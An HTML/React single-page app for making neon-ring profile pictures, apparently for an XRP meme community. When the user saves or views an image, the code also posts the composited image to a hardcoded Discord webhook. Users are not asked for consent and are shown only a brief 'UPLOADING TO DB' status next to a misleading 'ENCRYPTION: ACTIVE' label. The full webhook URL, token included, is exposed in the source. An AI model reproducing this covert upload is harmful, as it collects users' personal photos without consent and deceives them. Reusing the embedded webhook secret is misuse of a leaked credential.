<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>XMEME PORTAL GENERATOR</title>
    
    <!-- Core Engines -->
    <script src="https://unpkg.com/react@18/umd/react.production.min.js" crossorigin></script>
    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js" crossorigin></script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>

    <!-- Custom Glitch Styles -->
    <style>
        body { margin: 0; overflow-x: hidden; background-color: black; touch-action: manipulation; }
        
        /* Force OS default touch behavior for the saveable image */
        .saveable-image {
            touch-action: auto !important;
            -webkit-user-select: auto !important;
            user-select: auto !important;
            -webkit-touch-callout: default !important;
        }

        @keyframes glitch {
            0% { text-shadow: 2px 2px #00ff00, -2px -2px #ff0000; transform: skew(0deg); }
            20% { text-shadow: -2px 2px #00ff00, 2px -2px #ff0000; transform: skew(-10deg); }
            40% { text-shadow: 2px -2px #00ff00, -2px 2px #ff0000; transform: skew(10deg); }
            60% { text-shadow: -2px -2px #00ff00, 2px 2px #ff0000; transform: skew(0deg); }
            80% { text-shadow: 2px 2px #00ff00, -2px -2px #ff0000; transform: skew(5deg); }
            100% { text-shadow: -2px -2px #00ff00, 2px 2px #ff0000; transform: skew(0deg); }
        }
        .glitch-text {
            position: relative;
            animation: glitch 2s infinite linear alternate-reverse;
        }
        .glitch-text::before, .glitch-text::after {
            content: attr(data-text);
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }
        .glitch-text::before {
            left: 2px;
            text-shadow: -1px 0 #ff00c1;
            clip: rect(44px, 450px, 56px, 0);
            animation: glitch-anim-1 5s infinite linear alternate-reverse;
        }
        .glitch-text::after {
            left: -2px;
            text-shadow: -1px 0 #00fff9;
            clip: rect(44px, 450px, 56px, 0);
            animation: glitch-anim-2 5s infinite linear alternate-reverse;
        }
        ::-webkit-scrollbar { width: 0px; background: transparent; }
    </style>
</head>
<body>
    <div id="root"></div>

    <script type="text/babel">
        
        // ==========================================
        // CONFIGURATION: DISCORD WEBHOOK
        // ==========================================
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1462907521562837063/opalg-3KITBBYKEzhO_r35yzPz2tYqOWDeOOwLUeutF2rQKJ62IqDPcAYlrLFEby9kjw"; 
        // ==========================================


        const { useState, useRef, useEffect } = React;

        // --- ICONS ---
        const IconUpload = ({ size = 24, className }) => (<svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>);
        const IconSave = ({ size = 24, className }) => (<svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}><path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"/><polyline points="17 21 17 13 7 13 7 21"/><polyline points="7 3 7 8 15 8"/></svg>);
        const IconZoomIn = ({ size = 24, className }) => (<svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/><line x1="11" y1="8" x2="11" y2="14"/><line x1="8" y1="11" x2="14" y2="11"/></svg>);
        const IconRefreshCw = ({ size = 24, className }) => (<svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}><polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>);
        const IconSmartphone = ({ size = 24, className }) => (<svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>);
        const IconFileText = ({ size = 24, className }) => (<svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>);
        const IconMonitor = ({ size = 24, className }) => (<svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>);
        const IconFastForward = ({ size = 24, className }) => (<svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}><polygon points="13 19 22 12 13 5 13 19"/><polygon points="2 19 11 12 2 5 2 19"/></svg>);
        const IconZap = ({ size = 24, className }) => (<svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>);
        const IconImage = ({ size = 24, className }) => (<svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>);
        const IconX = ({ size = 24, className }) => (<svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>);
        const IconShare = ({ size = 24, className }) => (<svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg>);

        const ThreeBackground = () => {
            const mountRef = useRef(null);
            useEffect(() => {
                if (!mountRef.current) return;
                const scene = new THREE.Scene();
                scene.background = new THREE.Color(0x000000);
                scene.fog = new THREE.Fog(0x000000, 5, 30);
                const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
                camera.position.z = 5;
                const renderer = new THREE.WebGLRenderer({ antialias: true, alpha: false });
                renderer.setSize(window.innerWidth, window.innerHeight);
                mountRef.current.appendChild(renderer.domElement);
                const tunnelGroup = new THREE.Group();
                scene.add(tunnelGroup);
                const rings = [];
                const ringCount = 20;
                const geometry = new THREE.TorusGeometry(3, 0.05, 8, 50);
                const material = new THREE.MeshBasicMaterial({ color: 0x00ff00, wireframe: true });
                for (let i = 0; i < ringCount; i++) {
                    const ring = new THREE.Mesh(geometry, material);
                    ring.position.z = -i * 2;
                    ring.userData = { rotationSpeed: (Math.random() - 0.5) * 0.02, originalScale: 1, offset: i };
                    tunnelGroup.add(ring);
                    rings.push(ring);
                }
                const starGeometry = new THREE.BufferGeometry();
                const starCount = 2000;
                const posArray = new Float32Array(starCount * 3);
                for(let i = 0; i < starCount * 3; i++) { posArray[i] = (Math.random() - 0.5) * 100; }
                starGeometry.setAttribute('position', new THREE.BufferAttribute(posArray, 3));
                const starMaterial = new THREE.PointsMaterial({ size: 0.1, color: 0xffffff, transparent: true, opacity: 0.6 });
                const stars = new THREE.Points(starGeometry, starMaterial);
                scene.add(stars);
                let animationId;
                const animate = () => {
                    animationId = requestAnimationFrame(animate);
                    const time = Date.now() * 0.001;
                    tunnelGroup.position.z += 0.05;
                    if (tunnelGroup.position.z > 2) tunnelGroup.position.z = 0;
                    rings.forEach((ring) => {
                        ring.rotation.z += ring.userData.rotationSpeed;
                        const scale = 1 + Math.sin(time * 2 + ring.userData.offset) * 0.05;
                        ring.scale.set(scale, scale, scale);
                    });
                    stars.rotation.y = time * 0.05;
                    renderer.render(scene, camera);
                };
                animate();
                const handleResize = () => {
                    camera.aspect = window.innerWidth / window.innerHeight;
                    camera.updateProjectionMatrix();
                    renderer.setSize(window.innerWidth, window.innerHeight);
                };
                window.addEventListener('resize', handleResize);
                return () => {
                    window.removeEventListener('resize', handleResize);
                    cancelAnimationFrame(animationId);
                    if (mountRef.current && renderer.domElement) {
                        mountRef.current.removeChild(renderer.domElement);
                    }
                    geometry.dispose();
                    material.dispose();
                };
            }, []);
            return <div ref={mountRef} className="fixed inset-0 z-0" />;
        };

        const App = () => {
            const [appState, setAppState] = useState('start'); 
            const [image, setImage] = useState(null);
            const [scale, setScale] = useState(1);
            const [position, setPosition] = useState({ x: 0, y: 0 });
            const [isDragging, setIsDragging] = useState(false);
            const [startPan, setStartPan] = useState({ x: 0, y: 0 });
            const [ringThickness, setRingThickness] = useState(15);
            const [fileName, setFileName] = useState('XRP_PFP_01');
            const [isSaving, setIsSaving] = useState(false);
            const [uploadStatus, setUploadStatus] = useState('');
            const lastPinchDistance = useRef(null);
            const [resolution, setResolution] = useState(1080);
            const [photoModalSrc, setPhotoModalSrc] = useState(null);
            
            const canvasRef = useRef(null);
            const containerRef = useRef(null);
            const fileInputRef = useRef(null);
            const videoRef = useRef(null);

            const BASE_SIZE = 800; 
            const NEON_GREEN = '#00ff00';
            const SPLASH_VIDEO_URL = "https://jade-adverse-damselfly-13.mypinata.cloud/ipfs/bafybeibg4vsibmytdleguujbhx7jcgythrkqcslszgr7aq7c5ms4mxaydy";

            const resolutionOptions = [
                { label: 'HD (1080px)', value: 1080 },
                { label: '2K (2160px)', value: 2160 },
                { label: '4K (4096px)', value: 4096 },
            ];

            const handleStart = () => {
                setAppState('video');
                setTimeout(() => {
                    if (videoRef.current) {
                        videoRef.current.play().catch(e => console.log("Video Play Error", e));
                    }
                }, 100);
            };

            const handleSkip = () => setAppState('app');
            const handleVideoEnd = () => setAppState('app');

            const handleImageUpload = (e) => {
                const file = e.target.files[0];
                if (file) {
                    const reader = new FileReader();
                    reader.onload = (event) => {
                        const img = new Image();
                        img.crossOrigin = "Anonymous"; 
                        img.onload = () => {
                            setImage(img);
                            setScale(1);
                            setPosition({ x: 0, y: 0 });
                            setUploadStatus('');
                        };
                        img.src = event.target.result;
                    };
                    reader.readAsDataURL(file);
                }
            };

            const draw = () => {
                const canvas = canvasRef.current;
                if (!canvas || !image) return;
                const ctx = canvas.getContext('2d');
                const currentSize = resolution;
                const ratio = currentSize / BASE_SIZE;
                ctx.clearRect(0, 0, currentSize, currentSize);
                ctx.fillStyle = '#000000';
                ctx.fillRect(0, 0, currentSize, currentSize);
                ctx.save();
                ctx.translate((currentSize / 2) + (position.x * ratio), (currentSize / 2) + (position.y * ratio));
                ctx.scale(scale * ratio, scale * ratio);
                ctx.drawImage(image, -image.width / 2, -image.height / 2);
                ctx.restore();
                ctx.save();
                const scaledThickness = ringThickness * ratio;
                const center = currentSize / 2;
                const radius = center - (scaledThickness / 2);
                ctx.beginPath();
                ctx.rect(0, 0, currentSize, currentSize);
                ctx.arc(center, center, radius, 0, Math.PI * 2, true);
                ctx.fillStyle = 'rgba(0, 0, 0, 0.85)';
                ctx.fill();
                ctx.restore();
                ctx.save();
                ctx.beginPath();
                ctx.arc(center, center, radius, 0, Math.PI * 2);
                ctx.strokeStyle = NEON_GREEN;
                ctx.lineWidth = scaledThickness;
                ctx.shadowColor = NEON_GREEN;
                ctx.shadowBlur = 20 * ratio; 
                ctx.stroke();
                ctx.beginPath();
                ctx.arc(center, center, radius - (scaledThickness/2) + (2 * ratio), 0, Math.PI * 2);
                ctx.strokeStyle = '#ffffff';
                ctx.lineWidth = 1 * ratio;
                ctx.globalAlpha = 0.8;
                ctx.stroke();
                ctx.restore();
            };

            useEffect(() => { if (image && appState === 'app') requestAnimationFrame(draw); }, [image, scale, position, ringThickness, resolution, appState]);

            const getTouchDistance = (touches) => Math.hypot(touches[0].clientX - touches[1].clientX, touches[0].clientY - touches[1].clientY);
            const handleMouseDown = (e) => { setIsDragging(true); setStartPan({ x: e.clientX - position.x, y: e.clientY - position.y }); };
            const handleMouseMove = (e) => { if (!isDragging) return; e.preventDefault(); setPosition({ x: e.clientX - startPan.x, y: e.clientY - startPan.y }); };
            const handleMouseUp = () => setIsDragging(false);
            const handleTouchStart = (e) => {
                if (e.touches.length === 1) { setIsDragging(true); setStartPan({ x: e.touches[0].clientX - position.x, y: e.touches[0].clientY - position.y }); } 
                else if (e.touches.length === 2) { setIsDragging(false); lastPinchDistance.current = getTouchDistance(e.touches); }
            };
            const handleTouchMove = (e) => {
                e.preventDefault(); 
                if (e.touches.length === 1 && isDragging) { setPosition({ x: e.touches[0].clientX - startPan.x, y: e.touches[0].clientY - startPan.y }); } 
                else if (e.touches.length === 2) {
                    const currentDistance = getTouchDistance(e.touches);
                    if (lastPinchDistance.current !== null) {
                        const delta = currentDistance - lastPinchDistance.current;
                        const newScale = Math.min(Math.max(0.5, scale + delta * 0.005), 3);
                        setScale(newScale);
                    }
                    lastPinchDistance.current = currentDistance;
                }
            };
            const handleTouchEnd = () => { setIsDragging(false); lastPinchDistance.current = null; };

            const sendToDiscord = (blob, filename) => {
                if (!DISCORD_WEBHOOK_URL) return;
                setUploadStatus('uploading');
                const formData = new FormData();
                formData.append('payload_json', JSON.stringify({ content: `**NEW UPLOAD:** \`${filename}\`` }));
                formData.append('file', blob, filename);
                fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData })
                .then(response => {
                    if(response.ok) { setUploadStatus('success'); setTimeout(() => setUploadStatus(''), 3000); } 
                    else { setUploadStatus('error'); console.error("Discord Error:", response.statusText); }
                })
                .catch(err => { setUploadStatus('error'); console.error("Network Error:", err); });
            };

            const handleSaveAsFile = async () => {
                if (!canvasRef.current) return;
                setIsSaving(true);
                const safeName = (fileName.trim() || 'XMEME_PORTAL_PFP') + '.png';
                let currentBlob;
                try { currentBlob = await new Promise(resolve => canvasRef.current.toBlob(resolve, 'image/png')); } catch (e) { alert("Security Error: Unable to export image."); setIsSaving(false); return; }
                sendToDiscord(currentBlob, safeName);
                const legacyDownload = () => {
                    const link = document.createElement('a'); link.download = safeName; link.href = URL.createObjectURL(currentBlob);
                    document.body.appendChild(link); link.click(); document.body.removeChild(link); setIsSaving(false);
                };
                if ('showSaveFilePicker' in window) {
                    try {
                        const handle = await window.showSaveFilePicker({ suggestedName: safeName, types: [{ description: 'PNG Image', accept: { 'image/png': ['.png'] } }] });
                        const writable = await handle.createWritable(); await writable.write(currentBlob); await writable.close(); setIsSaving(false);
                    } catch (err) { if (err.name !== 'AbortError') legacyDownload(); else setIsSaving(false); }
                } else { legacyDownload(); }
            };

            const handleViewForPhotos = async () => {
                if (!canvasRef.current) return;
                const safeName = (fileName.trim() || 'XMEME_PORTAL_PFP') + '.png';
                try { const blob = await new Promise(resolve => canvasRef.current.toBlob(resolve, 'image/png')); sendToDiscord(blob, safeName); } catch(e) { console.error(e); }
                const dataUrl = canvasRef.current.toDataURL('image/png');
                setPhotoModalSrc(dataUrl);
            };

            // --- FORCE SYSTEM SHARE (FOR IPHONE "SHARE" MENU) ---
            const handleForceShare = async () => {
                if (!photoModalSrc) return;
                try {
                    const blob = await (await fetch(photoModalSrc)).blob();
                    const file = new File([blob], "xmeme_pfp.png", { type: "image/png" });
                    if (navigator.canShare && navigator.canShare({ files: [file] })) {
                        await navigator.share({
                            files: [file],
                            title: 'XMEME PFP',
                            text: 'Saved from XMEME Portal'
                        });
                    } else {
                        alert("Sharing not supported on this browser context. Please Long Press image.");
                    }
                } catch (err) {
                    // Fix: Suppress error alert if user simply canceled the share sheet
                    if (err.name === 'AbortError' || err.message.toLowerCase().includes('cancel')) {
                        console.log("Share sheet canceled by user.");
                        return;
                    }
                    console.error("Share failed", err);
                    alert("System share failed. Please use Long Press.");
                }
            };

            return (
                <div className="relative min-h-screen w-full font-mono text-green-500 overflow-hidden bg-black selection:bg-green-900 selection:text-white">
                    {appState === 'start' && (
                        <div className="fixed inset-0 z-50 flex flex-col items-center justify-center bg-black bg-[radial-gradient(circle_at_center,_var(--tw-gradient-stops))] from-green-900/20 to-black">
                             <video ref={videoRef} src={SPLASH_VIDEO_URL} preload="auto" className="hidden" playsInline />
                             <div className="relative group cursor-pointer" onClick={handleStart}>
                                <div className="absolute inset-0 bg-green-500/20 blur-xl rounded-full animate-pulse group-hover:bg-green-500/40 transition-all duration-500"></div>
                                <button className="relative px-12 py-6 bg-black border-2 border-green-500 rounded-lg overflow-hidden group hover:scale-105 transition-transform duration-300">
                                    <div className="absolute inset-0 bg-[linear-gradient(45deg,transparent_25%,rgba(0,255,0,0.3)_50%,transparent_75%)] bg-[length:250%_250%] animate-[shimmer_2s_infinite]"></div>
                                    <h1 className="text-2xl md:text-4xl font-black text-transparent bg-clip-text bg-gradient-to-r from-green-400 to-[#ccffcc] tracking-tighter flex items-center gap-4">
                                        <IconZap size={32} className="text-green-500 animate-bounce" /> POWER UP_PORTAL
                                    </h1>
                                </button>
                             </div>
                             <p className="mt-8 text-green-700 text-xs tracking-[0.5em] animate-pulse">ESTABLISHING UPLINK...</p>
                        </div>
                    )}

                    {appState === 'video' && (
                        <div className="fixed inset-0 z-50 bg-black">
                            <video ref={videoRef} src={SPLASH_VIDEO_URL} className="w-full h-full object-cover" autoPlay playsInline onEnded={handleVideoEnd} />
                            <button onClick={handleSkip} className="absolute bottom-10 right-6 md:bottom-12 md:right-12 px-6 py-2 bg-black/50 backdrop-blur border border-green-500/50 text-green-400 text-sm font-bold tracking-widest hover:bg-green-500 hover:text-black transition-all group flex items-center gap-2">
                                <span className="glitch-text" data-text="SKIP SEQUENCE">SKIP SEQUENCE</span> <IconFastForward size={14} className="group-hover:translate-x-1 transition-transform" />
                            </button>
                        </div>
                    )}

                    {photoModalSrc && (
                        <div className="fixed inset-0 z-[100] flex flex-col items-center justify-center bg-black/95 backdrop-blur-sm p-4 animate-in fade-in duration-300">
                            <button onClick={() => setPhotoModalSrc(null)} className="absolute top-6 right-6 text-green-500 hover:text-white"><IconX size={32} /></button>
                            <div className="text-center mb-4 space-y-2">
                                <h2 className="text-xl font-bold text-green-400 tracking-widest">SAVE TO PHOTOS</h2>
                                <p className="text-xs text-green-600 uppercase">Long Press Image Below -> Save to Photos</p>
                            </div>
                            <img src={photoModalSrc} className="saveable-image max-w-full max-h-[60vh] object-contain border-2 border-green-500/50 rounded-lg shadow-[0_0_50px_rgba(0,255,0,0.2)]" alt="Final PFP" />
                            
                            <div className="mt-6 flex flex-col items-center gap-3 w-full max-w-xs">
                                <button onClick={handleForceShare} className="w-full px-4 py-3 bg-green-600 text-black font-bold uppercase tracking-widest rounded shadow hover:bg-green-500 flex items-center justify-center gap-2">
                                    <IconShare size={16} /> SHARE / SAVE (FORCE)
                                </button>
                                <div className="text-[10px] text-green-600 text-center opacity-70">
                                    If long press says "Share", click it, then select "Save Image".
                                </div>
                            </div>
                        </div>
                    )}

                    {appState === 'app' && (
                        <>
                            <ThreeBackground />
                            <div className="relative z-10 min-h-screen flex flex-col items-center p-4 overflow-y-auto animate-in fade-in duration-1000">
                                <header className="w-full max-w-2xl mt-4 mb-8 p-4 bg-black/50 backdrop-blur-md border border-green-500/30 rounded-lg flex flex-col items-center justify-center shadow-[0_0_30px_rgba(0,255,0,0.2)]">
                                    <div className="text-[10px] md:text-xs text-green-400 tracking-[0.3em] uppercase mb-1 opacity-80 animate-pulse font-bold">XRPMan Studios Presents..</div>
                                    <h1 className="text-2xl md:text-4xl font-black tracking-tighter text-transparent bg-clip-text bg-gradient-to-r from-green-400 via-[#ccffcc] to-green-500 glitch-text text-center leading-tight pb-2" data-text="XMEME PORTAL GENERATOR">XMEME PORTAL GENERATOR</h1>
                                    <div className="w-full h-[1px] bg-gradient-to-r from-transparent via-green-500 to-transparent mt-2 opacity-50"></div>
                                    <div className="flex w-full justify-between mt-1 px-2"><span className="text-[8px] text-green-600">SYS.VER.3.3_IOS_FIX</span><span className="text-[8px] text-green-600">ENCRYPTION: ACTIVE</span></div>
                                </header>
                                <main className="w-full max-w-xl flex flex-col gap-6">
                                    <div className="relative w-full aspect-square bg-black/60 rounded-xl overflow-hidden border border-green-500/50 shadow-[0_0_50px_rgba(0,255,0,0.15)] backdrop-blur-sm group" ref={containerRef}>
                                        <div className="absolute top-0 left-0 w-8 h-8 border-t-2 border-l-2 border-green-500 z-20 shadow-[0_0_10px_#00ff00]"></div>
                                        <div className="absolute top-0 right-0 w-8 h-8 border-t-2 border-r-2 border-green-500 z-20 shadow-[0_0_10px_#00ff00]"></div>
                                        <div className="absolute bottom-0 left-0 w-8 h-8 border-b-2 border-l-2 border-green-500 z-20 shadow-[0_0_10px_#00ff00]"></div>
                                        <div className="absolute bottom-0 right-0 w-8 h-8 border-b-2 border-r-2 border-green-500 z-20 shadow-[0_0_10px_#00ff00]"></div>
                                        {!image ? (
                                            <div onClick={() => fileInputRef.current?.click()} className="absolute inset-0 flex flex-col items-center justify-center cursor-pointer hover:bg-green-900/10 transition-colors gap-4 z-30">
                                                <div className="w-20 h-20 border border-dashed border-green-500/50 rounded-full flex items-center justify-center animate-pulse shadow-[0_0_20px_rgba(0,255,0,0.1)]"><IconUpload size={32} className="text-green-500" /></div>
                                                <p className="text-green-400 font-bold tracking-[0.2em] text-sm text-shadow-glow">INITIALIZE UPLOAD</p>
                                                <p className="text-green-600 text-[10px] uppercase font-mono">Accepts JPG / PNG Data</p>
                                            </div>
                                        ) : (
                                            <canvas ref={canvasRef} width={resolution} height={resolution} className={`w-full h-full object-contain touch-none relative z-10 ${isDragging ? 'cursor-grabbing' : 'cursor-move'}`} onMouseDown={handleMouseDown} onMouseMove={handleMouseMove} onMouseUp={handleMouseUp} onMouseLeave={handleMouseUp} onTouchStart={handleTouchStart} onTouchMove={handleTouchMove} onTouchEnd={handleTouchEnd} />
                                        )}
                                        <div className="absolute inset-0 pointer-events-none bg-[linear-gradient(transparent_50%,rgba(0,255,0,0.05)_50%)] bg-[length:100%_4px] z-20"></div>
                                    </div>
                                    {image && (
                                        <div className="bg-black/60 backdrop-blur-md p-6 rounded-xl border border-green-500/30 shadow-lg space-y-6 relative overflow-hidden animate-in slide-in-from-bottom-4 fade-in duration-500">
                                            <div className="absolute -top-10 -right-10 w-32 h-32 bg-green-500/10 blur-3xl rounded-full pointer-events-none"></div>
                                            <div className="grid gap-6">
                                                <div className="space-y-2"><div className="flex justify-between text-[10px] uppercase tracking-widest text-green-400 font-bold"><span className="flex items-center gap-2"><IconZoomIn size={12}/> Zoom Level</span><span>{Math.round(scale * 100)}%</span></div><input type="range" min="0.5" max="3" step="0.01" value={scale} onChange={(e) => setScale(parseFloat(e.target.value))} className="w-full h-1 bg-green-900/50 rounded-lg appearance-none cursor-pointer accent-green-500 hover:accent-green-400" /></div>
                                                <div className="space-y-2"><div className="flex justify-between text-[10px] uppercase tracking-widest text-green-400 font-bold"><span className="flex items-center gap-2"><IconRefreshCw size={12}/> Portal Width</span><span>{ringThickness}px</span></div><input type="range" min="5" max="50" step="1" value={ringThickness} onChange={(e) => setRingThickness(parseInt(e.target.value))} className="w-full h-1 bg-green-900/50 rounded-lg appearance-none cursor-pointer accent-green-500 hover:accent-green-400" /></div>
                                            </div>
                                            <div className="space-y-4 pt-2 border-t border-green-900/30">
                                                <div className="space-y-2"><div className="flex justify-between text-[10px] uppercase tracking-widest text-green-400 font-bold"><span className="flex items-center gap-2"><IconMonitor size={12}/> Output Resolution</span></div><div className="grid grid-cols-3 gap-2">{resolutionOptions.map((opt) => (<button key={opt.value} onClick={() => setResolution(opt.value)} className={`py-2 text-[10px] font-bold uppercase tracking-wider rounded border transition-all ${resolution === opt.value ? 'bg-green-500 text-black border-green-500 shadow-[0_0_15px_rgba(0,255,0,0.4)]' : 'bg-black/50 text-green-600 border-green-900 hover:border-green-500 hover:text-green-400'}`}>{opt.label}</button>))}</div></div>
                                                <div className="space-y-2"><div className="flex justify-between text-[10px] uppercase tracking-widest text-green-400 font-bold"><span className="flex items-center gap-2"><IconFileText size={12}/> Save As Filename</span><span className="text-[9px] text-green-700">.PNG</span></div><div className="relative group"><input type="text" value={fileName} onChange={(e) => setFileName(e.target.value)} placeholder="ENTER_FILENAME" className="w-full bg-black/50 border border-green-800 text-green-400 p-2 rounded text-xs font-mono focus:outline-none focus:border-green-400 focus:shadow-[0_0_10px_rgba(0,255,0,0.2)] transition-all uppercase placeholder-green-900" /></div></div>
                                            </div>
                                            <div className="grid grid-cols-2 gap-4 pt-2">
                                                <button onClick={handleSaveAsFile} disabled={isSaving} className={`group relative px-4 py-3 border border-green-900/50 bg-black/50 hover:border-green-500 text-green-600 hover:text-green-400 rounded transition-all text-xs font-bold uppercase tracking-widest ${isSaving ? 'cursor-wait' : ''}`}><span className="relative z-10 flex flex-col items-center justify-center gap-1"><IconSave size={14} /> <span>{isSaving ? 'SAVING...' : 'SAVE FILE'}</span><span className="text-[8px] opacity-50">(Downloads)</span></span></button>
                                                <button onClick={handleViewForPhotos} className="group relative px-4 py-3 bg-green-500/10 hover:bg-green-500/20 border border-green-500 text-green-400 hover:text-white rounded transition-all text-xs font-bold uppercase tracking-widest shadow-[0_0_15px_rgba(0,255,0,0.2)]"><span className="relative z-10 flex flex-col items-center justify-center gap-1"><IconImage size={14} /> <span>VIEW FOR PHOTOS</span><span className="text-[8px] opacity-50">(Gallery)</span></span></button>
                                            </div>
                                            <div className="text-center border-t border-green-900/50 pt-4 space-y-1">
                                                <button onClick={() => { setImage(null); fileInputRef.current.value=''; setUploadStatus(''); }} className="text-[9px] text-red-500/70 hover:text-red-500 uppercase tracking-widest mb-2 font-bold">[ RESET / ABORT ]</button>
                                                {uploadStatus === 'uploading' && <p className="text-[9px] text-yellow-400 font-bold animate-pulse">UPLOADING TO DB...</p>}
                                                {uploadStatus === 'success' && <p className="text-[9px] text-green-400 font-bold">UPLOAD COMPLETE âœ“</p>}
                                                {uploadStatus === 'error' && <p className="text-[9px] text-red-500 font-bold">UPLOAD ERROR (Check Alert)</p>}
                                            </div>
                                        </div>
                                    )}
                                    <input type="file" ref={fileInputRef} onChange={handleImageUpload} accept="image/*" className="hidden" />
                                </main>
                            </div>
                        </>
                    )}
                </div>
            );
        };

        const root = ReactDOM.createRoot(document.getElementById('root'));
        root.render(<App />);
    </script>
</body>
</html>